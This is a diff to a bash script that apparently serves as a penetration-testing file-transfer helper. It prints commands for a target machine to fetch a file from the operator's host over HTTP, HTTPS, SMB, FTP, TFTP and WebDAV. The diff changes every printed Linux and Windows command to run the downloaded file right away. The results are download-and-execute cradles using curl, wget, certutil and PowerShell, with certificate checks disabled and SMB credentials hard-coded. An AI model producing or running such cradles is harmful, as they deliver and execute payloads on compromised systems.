@@ -217,20 +217,20 @@ else
       fi
       if [[ "$PROTOCOL" == "SMB" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
         echo "  Linux (SMB):"
-        echo "    smbclient \"//$LOCAL_IP/share\" -c \"get $f\""
+        echo "    smbclient \"//$LOCAL_IP/share\" -c \"get $f\" && chmod +x \"$f\" && ./\"$f\""
       fi
       if [[ "$PROTOCOL" == "FTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
         echo "  Linux (FTP):"
-        echo "    curl -u anonymous: \"ftp://$LOCAL_IP/$url_encoded\" -o \"$f\""
-        echo "    wget \"ftp://$LOCAL_IP/$url_encoded\" -O \"$f\""
+        echo "    curl -u anonymous: \"ftp://$LOCAL_IP/$url_encoded\" -o \"$f\" && chmod +x \"$f\" && ./\"$f\""
+        echo "    wget \"ftp://$LOCAL_IP/$url_encoded\" -O \"$f\" && chmod +x \"$f\" && ./\"$f\""
       fi
       if [[ "$PROTOCOL" == "TFTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
         echo "  Linux (TFTP):"
-        echo "    tftp $LOCAL_IP -c get \"$f\""
+        echo "    tftp $LOCAL_IP -c get \"$f\" && chmod +x \"$f\" && ./\"$f\""
       fi
       if [[ "$PROTOCOL" == "WebDAV" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
         echo "  Linux (WebDAV):"
-        echo "    curl -s \"http://$LOCAL_IP:$WEBDAV_PORT/$url_encoded\" -o \"$f\""
+        echo "    curl -s \"http://$LOCAL_IP:$WEBDAV_PORT/$url_encoded\" -o \"$f\" && chmod +x \"$f\" && ./\"$f\""
         echo "    cadaver http://$LOCAL_IP:$WEBDAV_PORT/"
       fi
       if [[ "$PROTOCOL" == "DNS" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
@@ -241,34 +241,34 @@ else
     elif [[ "$TARGET_OS" == "Windows" ]]; then
       if [[ "$PROTOCOL" == "HTTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
         echo "  Windows (HTTP):"
-        echo "    certutil -urlcache -split -f \"http://$LOCAL_IP:$PORT/$url_encoded\" \"$f\""
-        echo "    curl.exe \"http://$LOCAL_IP:$PORT/$url_encoded\" -o \"$f\""
-        echo "    PowerShell -Command \"iwr 'http://$LOCAL_IP:$PORT/$url_encoded' -OutFile '$f'\""
+        echo "    certutil -urlcache -split -f \"http://$LOCAL_IP:$PORT/$url_encoded\" \"$f\" && .\\\"$f\""
+        echo "    curl.exe \"http://$LOCAL_IP:$PORT/$url_encoded\" -o \"$f\" && .\\\"$f\""
+        echo "    PowerShell -Command \"iwr 'http://$LOCAL_IP:$PORT/$url_encoded' -OutFile '$f'; .\\'$f'\""
       fi
       if [[ "$PROTOCOL" == "HTTPS" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
         echo "  Windows (HTTPS - insecure):"
-        echo "    curl.exe -k \"https://$LOCAL_IP:$HTTPS_PORT/$url_encoded\" -o \"$f\""
+        echo "    curl.exe -k \"https://$LOCAL_IP:$HTTPS_PORT/$url_encoded\" -o \"$f\" && .\\\"$f\""
         # We use single quotes for echo to prevent bash expansion of $true, and double quotes for PowerShell -Command
-        echo "    PowerShell -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor 3072 -bor 768; [Net.ServicePointManager]::ServerCertificateValidationCallback = {\$true}; (New-Object System.Net.WebClient).DownloadFile('https://$LOCAL_IP:$HTTPS_PORT/$url_encoded', '$f')\""
-        echo "    PowerShell -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; [Net.ServicePointManager]::ServerCertificateValidationCallback = {\$true}; iwr 'https://$LOCAL_IP:$HTTPS_PORT/$url_encoded' -OutFile '$f'\""
+        echo "    PowerShell -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor 3072 -bor 768; [Net.ServicePointManager]::ServerCertificateValidationCallback = {\$true}; (New-Object System.Net.WebClient).DownloadFile('https://$LOCAL_IP:$HTTPS_PORT/$url_encoded', '$f'); .\\'$f'\""
+        echo "    PowerShell -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; [Net.ServicePointManager]::ServerCertificateValidationCallback = {\$true}; iwr 'https://$LOCAL_IP:$HTTPS_PORT/$url_encoded' -OutFile '$f'; .\\'$f'\""
       fi
       if [[ "$PROTOCOL" == "SMB" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
         echo "  Windows (SMB):"
-        echo "    net use \\\\$LOCAL_IP\\share /user:smbuser smbpass; cmd.exe /c copy \"\\\\$LOCAL_IP\\share\\$f\" ."
+        echo "    net use \\\\$LOCAL_IP\\share /user:smbuser smbpass; cmd.exe /c \"copy \\\\$LOCAL_IP\\share\\$f . && .\\$f\""
       fi
       if [[ "$PROTOCOL" == "FTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
         echo "  Windows (FTP):"
-        echo "    curl.exe \"ftp://$LOCAL_IP/$url_encoded\" -o \"$f\""
-        echo "    PowerShell -Command \"(New-Object System.Net.WebClient).DownloadFile('ftp://$LOCAL_IP/$f', '$f')\""
+        echo "    curl.exe \"ftp://$LOCAL_IP/$url_encoded\" -o \"$f\" && .\\\"$f\""
+        echo "    PowerShell -Command \"(New-Object System.Net.WebClient).DownloadFile('ftp://$LOCAL_IP/$f', '$f'); .\\'$f'\""
       fi
       if [[ "$PROTOCOL" == "TFTP" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
         echo "  Windows (TFTP):"
-        echo "    tftp -i $LOCAL_IP GET \"$f\""
+        echo "    tftp -i $LOCAL_IP GET \"$f\" && .\\\"$f\""
       fi
       if [[ "$PROTOCOL" == "WebDAV" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
         echo "  Windows (WebDAV):"
         echo "    (If service error: net start webclient)"
-        echo "    cmd.exe /c copy \"\\\\$LOCAL_IP@$WEBDAV_PORT\\DavWWWRoot\\$f\" ."
+        echo "    cmd.exe /c \"copy \\\\$LOCAL_IP@$WEBDAV_PORT\\DavWWWRoot\\$f . && .\\$f\""
         echo "    net use Z: \"\\\\$LOCAL_IP@$WEBDAV_PORT\\DavWWWRoot\""
       fi
       if [[ "$PROTOCOL" == "DNS" ]] || [[ "$PROTOCOL" == "ALL" ]]; then
